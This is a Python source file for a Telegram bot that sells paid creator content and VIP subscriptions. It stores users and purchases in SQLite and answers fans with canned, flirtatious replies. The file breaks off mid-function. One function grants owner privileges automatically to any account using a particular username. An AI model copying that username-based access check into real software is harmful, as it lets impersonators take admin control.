{"file_contents":{"main.py":{"content":"import os\nimport sqlite3\nimport threading\nimport datetime\nimport telebot\nfrom telebot import types\nfrom flask import Flask\nimport logging\nimport socket\nimport ipaddress\nimport requests\nimport tempfile\nfrom urllib.parse import urlparse\nimport mimetypes\n\n# Configure logging\nlogging.basicConfig(level=logging.INFO)\nlogger = logging.getLogger(__name__)\n\n# Initialize Flask app for Replit hosting\napp = Flask(__name__)\napp.secret_key = os.environ.get('SESSION_SECRET')\n\n# Bot token and owner IDs from environment variables\nBOT_TOKEN = os.getenv('BOT_TOKEN')\nOWNER_ID = int(os.getenv('OWNER_ID', '0'))  # Set this in Replit Secrets\n\n# Multiple owners system - will be initialized after environment validation\n\n# Special logging function for @blahgigi_official detection\ndef log_special_user_detection(message):\n    \"\"\"Log when @blahgigi_official interacts with the bot to capture her user ID\"\"\"\n    username = message.from_user.username or \"No username\"\n    user_id = message.from_user.id\n    first_name = message.from_user.first_name or \"No name\"\n    \n    if username == \"blahgigi_official\":\n        print(f\"\\n🎯 ===== @blahgigi_official DETECTED! =====\")\n        print(f\"👤 USER ID: {user_id}\")\n        print(f\"📧 First Name: {first_name}\")\n        print(f\"🔑 Username: @{username}\")\n        print(f\"🚨 ADD THIS ID TO OWNERS LIST: {user_id}\")\n        print(f\"============================================\\n\")\n        logger.info(f\"OWNER ACCESS DETECTION: @blahgigi_official (ID: {user_id}) interacted with bot\")\n        \n        # Also send notification to current owner\n        try:\n            if OWNER_ID != user_id:  # Don't send notification to herself\n                bot.send_message(OWNER_ID, f\"🎯 @blahgigi_official detected!\\n\\n👤 Name: {first_name}\\n🆔 User ID: {user_id}\\n🔑 Username: @{username}\\n\\n📋 Add this ID to OWNERS list for full access\")\n        except:\n            pass\n    \n    return user_id\n\n# Function to check if user is an owner\ndef is_owner(user_id):\n    \"\"\"Check if user_id is in the owners list\"\"\"\n    return user_id in OWNERS\n\n# For development/testing, check if we have the required credentials\nmissing_credentials = []\nif not BOT_TOKEN:\n    missing_credentials.append(\"BOT_TOKEN\")\nif OWNER_ID == 0:\n    missing_credentials.append(\"OWNER_ID\")\n\nif missing_credentials:\n    logger.error(f\"Missing required environment variables: {', '.join(missing_credentials)}\")\n    logger.error(\"Please add these to your Replit Secrets or environment variables\")\n    logger.info(\"Starting in web-only mode - Flask server will run for health checks\")\n    \n    # Set dummy values to prevent crashes when initializing bot\n    if not BOT_TOKEN:\n        BOT_TOKEN = \"dummy_token_for_web_mode\"\n    if OWNER_ID == 0:\n        OWNER_ID = 12345  # dummy ID\n\n# Initialize OWNERS list after environment validation\nOWNERS = [OWNER_ID]  # Will expand this list when we detect @blahgigi_official's ID\n\ndef notify_all_owners(message, parse_mode=None):\n    \"\"\"Send notification to all owners\"\"\"\n    for owner_id in OWNERS:\n        try:\n            bot.send_message(owner_id, message, parse_mode=parse_mode)\n        except:\n            pass\n\n# Initialize bot with proper token handling\nif BOT_TOKEN and BOT_TOKEN != \"dummy_token_for_web_mode\":\n    bot = telebot.TeleBot(BOT_TOKEN)\nelse:\n    # Create a dummy bot object for web-only mode - need valid format\n    bot = telebot.TeleBot(\"12345:DUMMY_TOKEN_FOR_WEB_MODE\")\n\n# Dictionary to store temporary upload data for guided content creation\nupload_sessions = {}\n\n# Dictionary to store notification composition sessions\nnotification_sessions = {}\n\n# Database setup\ndef init_database():\n    \"\"\"Initialize SQLite database with required tables\"\"\"\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    \n    # Users table\n    cursor.execute('''\n        CREATE TABLE IF NOT EXISTS users (\n            user_id INTEGER PRIMARY KEY,\n            username TEXT,\n            first_name TEXT,\n            join_date TEXT,\n            total_stars_spent INTEGER DEFAULT 0,\n            interaction_count INTEGER DEFAULT 0,\n            last_interaction TEXT\n        )\n    ''')\n    \n    # Loyal fans table\n    cursor.execute('''\n        CREATE TABLE IF NOT EXISTS loyal_fans (\n            user_id INTEGER PRIMARY KEY,\n            reason TEXT,\n            date_marked TEXT,\n            FOREIGN KEY (user_id) REFERENCES users (user_id)\n        )\n    ''')\n    \n    # AI-style responses table\n    cursor.execute('''\n        CREATE TABLE IF NOT EXISTS responses (\n            key TEXT PRIMARY KEY,\n            text TEXT\n        )\n    ''')\n    \n    # Content items table\n    cursor.execute('''\n        CREATE TABLE IF NOT EXISTS content_items (\n            name TEXT PRIMARY KEY,\n            price_stars INTEGER,\n            file_path TEXT,\n            description TEXT,\n            created_date TEXT,\n            content_type TEXT DEFAULT 'browse'\n        )\n    ''')\n    \n    # Add content_type column to existing content_items table if it doesn't exist\n    # This provides backward compatibility for existing databases\n    try:\n        cursor.execute(\"ALTER TABLE content_items ADD COLUMN content_type TEXT DEFAULT 'browse'\")\n        logger.info(\"Added content_type column to existing content_items table\")\n    except sqlite3.OperationalError:\n        # Column already exists, which is fine\n        pass\n    \n    # User purchases table - tracks individual content purchases for permanent access\n    cursor.execute('''\n        CREATE TABLE IF NOT EXISTS user_purchases (\n            id INTEGER PRIMARY KEY AUTOINCREMENT,\n            user_id INTEGER,\n            content_name TEXT,\n            purchase_date TEXT,\n            price_paid INTEGER,\n            UNIQUE (user_id, content_name),\n            FOREIGN KEY (user_id) REFERENCES users (user_id),\n            FOREIGN KEY (content_name) REFERENCES content_items (name)\n        )\n    ''')\n    \n    # Scheduled posts table\n    cursor.execute('''\n        CREATE TABLE IF NOT EXISTS scheduled_posts (\n            id INTEGER PRIMARY KEY AUTOINCREMENT,\n            datetime TEXT,\n            content TEXT,\n            created_date TEXT\n        )\n    ''')\n    \n    # User backup table\n    cursor.execute('''\n        CREATE TABLE IF NOT EXISTS user_backups (\n            user_id INTEGER,\n            username TEXT,\n            first_name TEXT,\n            join_date TEXT,\n            total_stars_spent INTEGER,\n            interaction_count INTEGER,\n            last_interaction TEXT,\n            backup_date TEXT\n        )\n    ''')\n    \n    # VIP subscriptions table\n    cursor.execute('''\n        CREATE TABLE IF NOT EXISTS vip_subscriptions (\n            user_id INTEGER PRIMARY KEY,\n            start_date TEXT,\n            expiry_date TEXT,\n            is_active INTEGER DEFAULT 1,\n            total_payments INTEGER DEFAULT 0,\n            FOREIGN KEY (user_id) REFERENCES users (user_id)\n        )\n    ''')\n    \n    # VIP settings table\n    cursor.execute('''\n        CREATE TABLE IF NOT EXISTS vip_settings (\n            key TEXT PRIMARY KEY,\n            value TEXT\n        )\n    ''')\n    \n    # Teasers table\n    cursor.execute('''\n        CREATE TABLE IF NOT EXISTS teasers (\n            id INTEGER PRIMARY KEY AUTOINCREMENT,\n            file_path TEXT,\n            file_type TEXT,\n            description TEXT,\n            created_date TEXT,\n            vip_only INTEGER DEFAULT 0\n        )\n    ''')\n    \n    # Add vip_only column to existing teasers table if it doesn't exist\n    try:\n        cursor.execute(\"ALTER TABLE teasers ADD COLUMN vip_only INTEGER DEFAULT 0\")\n        logger.info(\"Added vip_only column to existing teasers table\")\n    except sqlite3.OperationalError:\n        # Column already exists, which is fine\n        pass\n    \n    # Insert default VIP settings\n    vip_settings = [\n        ('vip_price_stars', '399'),\n        ('vip_duration_days', '30'),\n        ('vip_description', 'Premium VIP access with exclusive content and direct chat')\n    ]\n    \n    for key, value in vip_settings:\n        cursor.execute('INSERT OR IGNORE INTO vip_settings (key, value) VALUES (?, ?)', (key, value))\n    \n    # Insert default AI responses\n    default_responses = [\n        ('greeting', 'Hey there! 😊 Thanks for reaching out! I love connecting with you baby. What\\'s on your mind?'),\n        ('question', 'That\\'s a great question! I appreciate you asking. Feel free to check out my content or ask me anything else! 💕'),\n        ('compliment', 'Aww, you\\'re so sweet! Thank you! That really makes my day. You\\'re amazing! ✨'),\n        ('default', 'Thanks for the message! I love hearing from you. Don\\'t forget to check out my exclusive content! 😘')\n    ]\n    \n    for key, text in default_responses:\n        cursor.execute('INSERT OR IGNORE INTO responses (key, text) VALUES (?, ?)', (key, text))\n    \n    \n    conn.commit()\n    conn.close()\n    logger.info(\"Database initialized successfully\")\n\ndef get_db_connection():\n    \"\"\"Get SQLite database connection with proper settings\"\"\"\n    conn = sqlite3.connect('content_bot.db')\n    conn.execute('PRAGMA foreign_keys = ON')  # Enable foreign key constraints\n    return conn\n\ndef get_user_data(user_id):\n    \"\"\"Get user data from database\"\"\"\n    conn = get_db_connection()\n    cursor = conn.cursor()\n    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))\n    user = cursor.fetchone()\n    conn.close()\n    return user\n\ndef add_or_update_user(user):\n    \"\"\"Add new user or update existing user data\"\"\"\n    # SPECIAL DETECTION: Check for @blahgigi_official and log her ID\n    if hasattr(user, 'username') and user.username == \"blahgigi_official\":\n        print(f\"\\n🎯 ===== @blahgigi_official DETECTED! =====\")\n        print(f\"👤 USER ID: {user.id}\")\n        print(f\"📧 First Name: {user.first_name}\")\n        print(f\"🔑 Username: @{user.username}\")\n        print(f\"🚨 ADD THIS ID TO OWNERS LIST: {user.id}\")\n        print(f\"============================================\\n\")\n        logger.info(f\"OWNER ACCESS DETECTION: @blahgigi_official (ID: {user.id}) interacted with bot\")\n        \n        # AUTOMATICALLY add to OWNERS list if not already there\n        if user.id not in OWNERS:\n            OWNERS.append(user.id)\n            print(f\"✅ @blahgigi_official (ID: {user.id}) AUTOMATICALLY ADDED to OWNERS list!\")\n            logger.info(f\"OWNER ADDED: @blahgigi_official (ID: {user.id}) added to OWNERS list automatically\")\n        \n        # Notify all other owners\n        try:\n            for owner_id in OWNERS:\n                if owner_id != user.id:  # Don't send notification to herself\n                    try:\n                        bot.send_message(owner_id, f\"🎯 @blahgigi_official detected and granted owner access!\\n\\n👤 Name: {user.first_name}\\n🆔 User ID: {user.id}\\n🔑 Username: @{user.username}\\n\\n✅ Automatically added to OWNERS list\")\n                    except:\n                        pass\n        except:\n            pass\n\n    # Prevent owners from being registered as regular users\n    if is_owner(user.id):\n        return  # Don't register owners\n    \n    # Prevent bots from being registered as users\n    if getattr(user, 'is_bot', False):\n        return  # Don't register bot accounts\n    \n    # Prevent accounts with bot-like usernames from being registered\n    if user.username and user.username.lower().endswith('bot'):\n        return  # Don't register likely bot accounts\n    \n    # Prevent bot from registering itself as a user\n    try:\n        bot_info = bot.get_me()\n        if user.id == bot_info.id:\n            return  # Don't process bot's own messages\n    except Exception as e:\n        logger.warning(f\"Could not get bot info: {e}\")\n        # Continue processing if we can't get bot info\n    \n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    \n    now = datetime.datetime.now().isoformat()\n    \n    # Check if user exists\n    existing_user = get_user_data(user.id)\n    \n    if existing_user:\n        # Update interaction count and last interaction\n        cursor.execute('''\n            UPDATE users \n            SET interaction_count = interaction_count + 1, \n                last_interaction = ?,\n                username = ?,\n                first_name = ?\n            WHERE user_id = ?\n        ''', (now, user.username, user.first_name, user.id))\n    else:\n        # Add new user\n        cursor.execute('''\n            INSERT INTO users (user_id, username, first_name, join_date, last_interaction, interaction_count)\n            VALUES (?, ?, ?, ?, ?, 1)\n        ''', (user.id, user.username, user.first_name, now, now))\n        \n        # Send welcome notification to all owners\n        try:\n            notify_all_owners(f\"👋 New user started chatting!\\n👤 {user.first_name} (@{user.username})\\n🆔 ID: {user.id}\")\n        except:\n            pass\n    \n    conn.commit()\n    conn.close()\n\ndef check_user_owns_content(user_id, content_name):\n    \"\"\"Check if user has already purchased specific content\"\"\"\n    conn = get_db_connection()\n    cursor = conn.cursor()\n    cursor.execute('SELECT id FROM user_purchases WHERE user_id = ? AND content_name = ?', (user_id, content_name))\n    purchase = cursor.fetchone()\n    conn.close()\n    return purchase is not None\n\ndef get_user_purchased_content(user_id):\n    \"\"\"Get all BROWSE content purchased by a user - does not include VIP content\"\"\"\n    conn = get_db_connection()\n    cursor = conn.cursor()\n    cursor.execute('''\n        SELECT up.content_name, up.purchase_date, up.price_paid, ci.description, ci.file_path\n        FROM user_purchases up\n        JOIN content_items ci ON up.content_name = ci.name\n        WHERE up.user_id = ? AND ci.content_type = ?\n        ORDER BY up.purchase_date DESC\n    ''', (user_id, 'browse'))\n    purchases = cursor.fetchall()\n    conn.close()\n    return purchases\n\ndef get_vip_subscribers():\n    \"\"\"Get all active VIP subscribers for notifications\"\"\"\n    conn = get_db_connection()\n    cursor = conn.cursor()\n    \n    # Get active VIP subscribers\n    cursor.execute('''\n        SELECT u.user_id, u.first_name, u.username\n        FROM users u\n        JOIN vip_subscriptions v ON u.user_id = v.user_id\n        WHERE v.is_active = 1 AND datetime(v.expiry_date) > datetime('now')\n            AND u.user_id != ?\n            AND (u.username IS NULL OR LOWER(u.username) NOT LIKE '%bot')\n    ''', (OWNER_ID,))\n    \n    vip_users = cursor.fetchall()\n    conn.close()\n    return vip_users\n\ndef get_non_vip_users():\n    \"\"\"Get all non-VIP users (users without active VIP subscriptions) for notifications\"\"\"\n    conn = get_db_connection()\n    cursor = conn.cursor()\n    \n    # Get users who are not VIP subscribers (no active subscription or expired)\n    cursor.execute('''\n        SELECT u.user_id, u.first_name, u.username\n        FROM users u\n        LEFT JOIN vip_subscriptions v ON u.user_id = v.user_id\n        WHERE (v.user_id IS NULL \n           OR v.is_active = 0 \n           OR datetime(v.expiry_date) <= datetime('now'))\n            AND u.user_id != ?\n            AND (u.username IS NULL OR LOWER(u.username) NOT LIKE '%bot')\n    ''', (OWNER_ID,))\n    \n    non_vip_users = cursor.fetchall()\n    conn.close()\n    return non_vip_users\n\ndef get_all_users():\n    \"\"\"Get all users for general notifications\"\"\"\n    conn = get_db_connection()\n    cursor = conn.cursor()\n    cursor.execute('''\n        SELECT user_id, first_name, username \n        FROM users \n        WHERE user_id != ? \n            AND (username IS NULL OR LOWER(username) NOT LIKE '%bot')\n        ORDER BY last_interaction DESC\n    ''', (OWNER_ID,))\n    all_users = cursor.fetchall()\n    conn.close()\n    return all_users\n\ndef send_notification_to_users(user_list, message_text, markup=None, pin_message=False):\n    \"\"\"\n    Send notifications to a list of users with error handling\n    \n    Args:\n        user_list: List of tuples (user_id, first_name, username)\n        message_text: HTML formatted message text\n        markup: InlineKeyboardMarkup for buttons (optional)\n        pin_message: Whether to pin the message (default False)\n    \n    Returns:\n        dict: Statistics about sent/failed notifications\n    \"\"\"\n    sent_count = 0\n    failed_count = 0\n    blocked_count = 0\n    failed_users = []\n    \n    for user_id, first_name, username in user_list:\n        try:\n            # Don't send to bot owner to avoid spam\n            if is_owner(user_id):\n                continue\n                \n            # Send the notification\n            sent_message = bot.send_message(\n                user_id, \n                message_text, \n                reply_markup=markup, \n                parse_mode='HTML',\n                disable_notification=False\n            )\n            \n            # Pin message if requested and successfully sent\n            if pin_message and sent_message:\n                try:\n                    bot.pin_chat_message(user_id, sent_message.message_id, disable_notification=True)\n                except Exception as pin_error:\n                    logger.warning(f\"Failed to pin message for user {user_id}: {pin_error}\")\n            \n            sent_count += 1\n            logger.info(f\"Notification sent to {first_name} (@{username}) - ID: {user_id}\")\n            \n        except Exception as e:\n            # Check if it's a Telegram API exception indicating user blocked the bot\n            error_str = str(e).lower()\n            if \"403\" in error_str or \"forbidden\" in error_str or \"blocked\" in error_str:\n                # User blocked the bot\n                blocked_count += 1\n                logger.info(f\"User {first_name} (@{username}) has blocked the bot\")\n            else:\n                failed_count += 1\n                failed_users.append((user_id, first_name, username, str(e)))\n                logger.error(f\"Failed to send notification to {first_name} (@{username}): {e}\")\n    \n    return {\n        'sent': sent_count,\n        'failed': failed_count,\n        'blocked': blocked_count,\n        'failed_users': failed_users,\n        'total_targeted': len(user_list)\n    }\n\ndef notify_vip_teaser_uploaded(teaser_description):\n    \"\"\"Send notification to all VIP subscribers about new VIP teaser\"\"\"\n    vip_users = get_vip_subscribers()\n    \n    if not vip_users:\n        logger.info(\"No VIP users to notify about new VIP teaser\")\n        return {'sent': 0, 'failed': 0, 'blocked': 0, 'total_targeted': 0}\n    \n    # Create VIP teaser notification message\n    notification_text = f\"\"\"\n💎 <b>NEW VIP EXCLUSIVE TEASER!</b> 💎\n\n🎬 A brand new VIP teaser just dropped exclusively for you!\n\n✨ <b>What's new:</b> {teaser_description}\n\n🔥 As a VIP member, you get exclusive access to premium teasers that nobody else can see!\n\n💕 Thank you for being an amazing VIP supporter!\n\"\"\"\n    \n    # Create inline keyboard with VIP teaser button\n    markup = types.InlineKeyboardMarkup()\n    markup.add(types.InlineKeyboardButton(\"🎬 View VIP Teasers\", callback_data=\"vip_teasers_collection\"))\n    markup.add(types.InlineKeyboardButton(\"💎 VIP Status\", callback_data=\"vip_status\"))\n    \n    # Send notifications with message pinning\n    stats = send_notification_to_users(vip_users, notification_text, markup, pin_message=True)\n    \n    # Log results\n    logger.info(f\"VIP teaser notification sent to {stats['sent']}/{stats['total_targeted']} VIP users\")\n    \n    # Notify owner about broadcast results\n    try:\n        owner_message = f\"\"\"\n📊 <b>VIP TEASER NOTIFICATION SENT</b>\n\n🎬 <b>Teaser:</b> {teaser_description}\n✅ <b>Sent:</b> {stats['sent']} users\n❌ <b>Failed:</b> {stats['failed']} users\n🚫 <b>Blocked:</b> {stats['blocked']} users\n📱 <b>Total VIPs:</b> {stats['total_targeted']} users\n\n💡 All VIP members have been notified about the new exclusive teaser!\n\"\"\"\n        bot.send_message(OWNER_ID, owner_message, parse_mode='HTML')\n    except Exception as e:\n        logger.error(f\"Failed to notify owner about VIP teaser broadcast: {e}\")\n    \n    return stats\n\ndef notify_free_teaser_uploaded(teaser_description):\n    \"\"\"Send notification to all non-VIP users about new free teaser\"\"\"\n    non_vip_users = get_non_vip_users()\n    \n    if not non_vip_users:\n        logger.info(\"No non-VIP users to notify about new free teaser\")\n        return {'sent': 0, 'failed': 0, 'blocked': 0, 'total_targeted': 0}\n    \n    # Create free teaser notification message\n    notification_text = f\"\"\"\n🎬 <b>NEW FREE TEASER AVAILABLE!</b> 🎬\n\n✨ I just dropped a brand new teaser for you to enjoy!\n\n🎁 <b>What's new:</b> {teaser_description}\n\n💡 <b>Want more exclusive content?</b>\nUpgrade to VIP for premium teasers and unlimited access to my exclusive content library!\n\n🔥 Don't miss out - check it out now!\n\"\"\"\n    \n    # Create inline keyboard with teaser and VIP upgrade buttons\n    markup = types.InlineKeyboardMarkup()\n    markup.add(types.InlineKeyboardButton(\"🎬 View Free Teasers\", callback_data=\"teasers\"))\n    markup.add(types.InlineKeyboardButton(\"💎 Upgrade to VIP\", callback_data=\"vip_access\"))\n    \n    # Send notifications with message pinning\n    stats = send_notification_to_users(non_vip_users, notification_text, markup, pin_message=True)\n    \n    # Log results\n    logger.info(f\"Free teaser notification sent to {stats['sent']}/{stats['total_targeted']} non-VIP users\")\n    \n    # Notify owner about broadcast results\n    try:\n        owner_message = f\"\"\"\n📊 <b>FREE TEASER NOTIFICATION SENT</b>\n\n🎬 <b>Teaser:</b> {teaser_description}\n✅ <b>Sent:</b> {stats['sent']} users\n❌ <b>Failed:</b> {stats['failed']} users\n🚫 <b>Blocked:</b> {stats['blocked']} users\n👥 <b>Total Non-VIPs:</b> {stats['total_targeted']} users\n\n💡 All non-VIP users have been notified about the new free teaser!\n\"\"\"\n        bot.send_message(OWNER_ID, owner_message, parse_mode='HTML')\n    except Exception as e:\n        logger.error(f\"Failed to notify owner about free teaser broadcast: {e}\")\n    \n    return stats\n\ndef deliver_owned_content(chat_id, user_id, content_name):\n    \"\"\"Re-deliver content that user already owns\"\"\"\n    # First verify the user actually owns this content\n    if not check_user_owns_content(user_id, content_name):\n        bot.send_message(chat_id, \"❌ You don't own this content. Please purchase it first!\")\n        return False\n    \n    # Get content details\n    conn = get_db_connection()\n    cursor = conn.cursor()\n    cursor.execute('SELECT file_path, description FROM content_items WHERE name = ?', (content_name,))\n    content = cursor.fetchone()\n    conn.close()\n    \n    if not content:\n        bot.send_message(chat_id, f\"❌ Content '{content_name}' not found.\")\n        return False\n    \n    file_path, description = content\n    \n    # Send re-access message\n    reaccess_message = f\"\"\"\n✅ <b>OWNED CONTENT ACCESS</b> ✅\n\n🎁 Here's your purchased content again!\n\n<b>{content_name}</b>\n{description}\n\n💕 Baby, Thank you for supporting Mammy!\n\"\"\"\n    \n    bot.send_message(chat_id, reaccess_message, parse_mode='HTML')\n    \n    # Send the actual content (same logic as purchase delivery)\n    try:\n        if file_path.startswith('http'):\n            # It's a URL\n            if any(ext in file_path.lower() for ext in ['.jpg', '.jpeg', '.png', '.gif']):\n                bot.send_photo(chat_id, file_path, caption=f\"🎁 {content_name}\")\n            elif any(ext in file_path.lower() for ext in ['.mp4', '.mov', '.avi']):\n                bot.send_video(chat_id, file_path, caption=f\"🎁 {content_name}\")\n            else:\n                bot.send_document(chat_id, file_path, caption=f\"🎁 {content_name}\")\n        elif len(file_path) > 50 and not file_path.startswith('/'):\n            # It's a Telegram file_id\n            try:\n                bot.send_photo(chat_id, file_path, caption=f\"🎁 {content_name}\")\n            except:\n                try:\n                    bot.send_video(chat_id, file_path, caption=f\"🎁 {content_name}\")\n                except:\n                    try:\n                        bot.send_document(chat_id, file_path, caption=f\"🎁 {content_name}\")\n                    except:\n                        bot.send_message(chat_id, f\"🎁 Your content: {content_name}\\n\\nFile ID: {file_path}\\n\\n⚠️ If you have trouble accessing this content, please contact me!\")\n        else:\n            # It's a local file path\n            with open(file_path, 'rb') as file:\n                if any(ext in file_path.lower() for ext in ['.jpg', '.jpeg', '.png', '.gif']):\n                    bot.send_photo(chat_id, file, caption=f\"🎁 {content_name}\")\n                elif any(ext in file_path.lower() for ext in ['.mp4', '.mov', '.avi']):\n                    bot.send_video(chat_id, file, caption=f\"🎁 {content_name}\")\n                else:\n                    bot.send_document(chat_id, file, caption=f\"🎁 {content_name}\")\n    except Exception as e:\n        bot.send_message(chat_id, f\"🎁 Your owned content: {content_name}\\n\\n⚠️ There was an issue delivering your content. Please contact me and I'll send it manually!\")\n        logger.error(f\"Error sending owned content {content_name}: {e}\")\n        return False\n    \n    return True\n\ndef show_my_content(chat_id, user_id):\n    \"\"\"Show user's purchased content library with re-access options\"\"\"\n    # Get user's purchased content\n    purchases = get_user_purchased_content(user_id)\n    \n    if not purchases:\n        no_content_message = \"\"\"\n📂 <b>MY CONTENT LIBRARY</b> 📂\n\n🚫 You haven't purchased any content yet!\n\n🛒 <b>Ready to get started?</b>\nStep into my world and Browse the exclusive content you’ve been craving.\n\n💡 <b>Secret:</b> Unlock the VIP experience and indulge in content that’s just for you. Go ahead, spoil yourself. 💋\n\"\"\"\n        markup = types.InlineKeyboardMarkup()\n        markup.add(types.InlineKeyboardButton(\"🛒 Browse Content\", callback_data=\"browse_content\"))\n        markup.add(types.InlineKeyboardButton(\"💎 Upgrade to VIP\", callback_data=\"vip_access\"))\n        markup.add(types.InlineKeyboardButton(\"🏠 Back to Main\", callback_data=\"cmd_start\"))\n        \n        bot.send_message(chat_id, no_content_message, reply_markup=markup, parse_mode='HTML')\n        return\n    \n    # Create content library message\n    library_text = f\"📂 <b>MY CONTENT LIBRARY</b> 📂\\n\\n\"\n    library_text += f\"🎉 You own {len(purchases)} piece(s) of exclusive content!\\n\\n\"\n    \n    markup = types.InlineKeyboardMarkup()\n    \n    for content_name, purchase_date, price_paid, description, file_path in purchases:\n        # Escape HTML special characters\n        safe_name = content_name.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\n        safe_description = description.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\n        \n        # Format purchase date\n        try:\n            date_obj = datetime.datetime.fromisoformat(purchase_date)\n            formatted_date = date_obj.strftime(\"%b %d, %Y\")\n        except:\n            formatted_date = \"Unknown\"\n        \n        library_text += f\"✨ <b>{safe_name}</b>\\n\"\n        library_text += f\"📅 Purchased: {formatted_date}\\n\"\n        library_text += f\"💰 Paid: {price_paid:,} Stars\\n\"\n        library_text += f\"📝 {safe_description}\\n\\n\"\n        \n        # Add re-access button for each item\n        markup.add(types.InlineKeyboardButton(f\"🎁 Access {content_name}\", callback_data=f\"access_{content_name}\"))\n    \n    # Add navigation buttons\n    markup.add(types.InlineKeyboardButton(\"🛒 Browse More Content\", callback_data=\"browse_content\"))\n    markup.add(types.InlineKeyboardButton(\"🏠 Back to Main\", callback_data=\"cmd_start\"))\n    \n    bot.send_message(chat_id, library_text, reply_markup=markup, parse_mode='HTML')\n\ndef show_analytics_dashboard(chat_id):\n    \"\"\"Show comprehensive analytics dashboard\"\"\"\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    \n    # Get user statistics\n    cursor.execute('SELECT COUNT(*) FROM users')\n    total_users = cursor.fetchone()[0]\n    \n    cursor.execute('SELECT COUNT(*) FROM users WHERE last_interaction >= ?', ((datetime.datetime.now() - datetime.timedelta(days=7)).isoformat(),))\n    active_users_7d = cursor.fetchone()[0]\n    \n    cursor.execute('SELECT COUNT(*) FROM users WHERE total_stars_spent > 0')\n    paying_users = cursor.fetchone()[0]\n    \n    # Get VIP statistics\n    cursor.execute('SELECT COUNT(*) FROM vip_subscriptions WHERE is_active = 1')\n    active_vips = cursor.fetchone()[0]\n    \n    # Get content statistics\n    cursor.execute('SELECT COUNT(*) FROM content_items WHERE content_type = ?', ('browse',))\n    browse_content_count = cursor.fetchone()[0]\n    \n    cursor.execute('SELECT COUNT(*) FROM content_items WHERE content_type = ?', ('vip',))\n    vip_content_count = cursor.fetchone()[0]\n    \n    cursor.execute('SELECT COUNT(*) FROM teasers')\n    teaser_count = cursor.fetchone()[0]\n    \n    # Get revenue statistics\n    cursor.execute('SELECT SUM(total_stars_spent) FROM users')\n    total_revenue = cursor.fetchone()[0] or 0\n    \n    cursor.execute('SELECT AVG(total_stars_spent) FROM users WHERE total_stars_spent > 0')\n    avg_spent = cursor.fetchone()[0] or 0\n    \n    # Get top customers\n    cursor.execute('''\n        SELECT first_name, username, total_stars_spent, interaction_count\n        FROM users \n        WHERE total_stars_spent > 0 \n        ORDER BY total_stars_spent DESC \n        LIMIT 5\n    ''')\n    top_customers = cursor.fetchall()\n    \n    conn.close()\n    \n    analytics_text = f\"\"\"📊 <b>ANALYTICS DASHBOARD</b> 📊\n\n👥 <b>User Statistics:</b>\n• Total Users: {total_users:,}\n• Active (7 days): {active_users_7d:,}\n• Paying Customers: {paying_users:,}\n• VIP Members: {active_vips:,}\n\n💰 <b>Revenue:</b>\n• Total Revenue: {total_revenue:,} Stars\n• Average per Customer: {avg_spent:,.0f} Stars\n• Conversion Rate: {(paying_users/max(total_users,1)*100):.1f}%\n\n📱 <b>Content:</b>\n• Browse Content: {browse_content_count}\n• VIP Content: {vip_content_count}\n• Teasers: {teaser_count}\n\n🏆 <b>Top Customers:</b>\"\"\"\n    \n    if top_customers:\n        for i, (first_name, username, spent, interactions) in enumerate(top_customers):\n            safe_name = (first_name or 'N/A').replace('<', '&lt;').replace('>', '&gt;')\n            safe_username = (username or 'none').replace('<', '&lt;').replace('>', '&gt;')\n            analytics_text += f\"\\n{i+1}. {safe_name} (@{safe_username}) - {spent:,} Stars\"\n    else:\n        analytics_text += \"\\nNo paying customers yet.\"\n    \n    markup = types.InlineKeyboardMarkup()\n    markup.add(types.InlineKeyboardButton(\"👥 View All Users\", callback_data=\"owner_list_users\"))\n    markup.add(types.InlineKeyboardButton(\"💎 VIP Analytics\", callback_data=\"vip_analytics\"))\n    markup.add(types.InlineKeyboardButton(\"🔙 Back to Owner Menu\", callback_data=\"owner_help\"))\n    \n    bot.send_message(chat_id, analytics_text, reply_markup=markup, parse_mode='HTML')\n\ndef get_ai_response(message_text):\n    \"\"\"Get response based on message content\"\"\"\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    \n    message_lower = message_text.lower()\n    \n    # Determine response type based on keywords\n    if any(word in message_lower for word in ['hi', 'hello', 'hey', 'good morning', 'good evening']):\n        response_key = 'greeting'\n    elif any(word in message_lower for word in ['beautiful', 'gorgeous', 'amazing', 'love', 'perfect']):\n        response_key = 'compliment'\n    elif '?' in message_text:\n        response_key = 'question'\n    else:\n        response_key = 'default'\n    \n    cursor.execute('SELECT text FROM responses WHERE key = ?', (response_key,))\n    result = cursor.fetchone()\n    \n    if result:\n        response = result[0]\n    else:\n        response = \"Thanks for the message! 😊\"\n    \n    conn.close()\n    return response\n\ndef get_teasers():\n    \"\"\"Get all regular (non-VIP) teasers from database\"\"\"\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('SELECT file_path, file_type, description FROM teasers WHERE vip_only = 0 ORDER BY created_date DESC')\n    teasers = cursor.fetchall()\n    conn.close()\n    return teasers\n\ndef get_teasers_with_id():\n    \"\"\"Get all regular (non-VIP) teasers with IDs for management\"\"\"\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('SELECT id, file_path, file_type, description, created_date FROM teasers WHERE vip_only = 0 ORDER BY created_date DESC')\n    teasers = cursor.fetchall()\n    conn.close()\n    return teasers\n\ndef get_vip_teasers():\n    \"\"\"Get all VIP-only teasers from database\"\"\"\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('SELECT file_path, file_type, description FROM teasers WHERE vip_only = 1 ORDER BY created_date DESC')\n    teasers = cursor.fetchall()\n    conn.close()\n    return teasers\n\ndef get_vip_teasers_with_id():\n    \"\"\"Get all VIP-only teasers with IDs for management\"\"\"\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('SELECT id, file_path, file_type, description, created_date FROM teasers WHERE vip_only = 1 ORDER BY created_date DESC')\n    teasers = cursor.fetchall()\n    conn.close()\n    return teasers\n\ndef delete_teaser(teaser_id):\n    \"\"\"Delete a teaser by ID\"\"\"\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('DELETE FROM teasers WHERE id = ?', (teaser_id,))\n    deleted_count = cursor.rowcount\n    conn.commit()\n    conn.close()\n    return 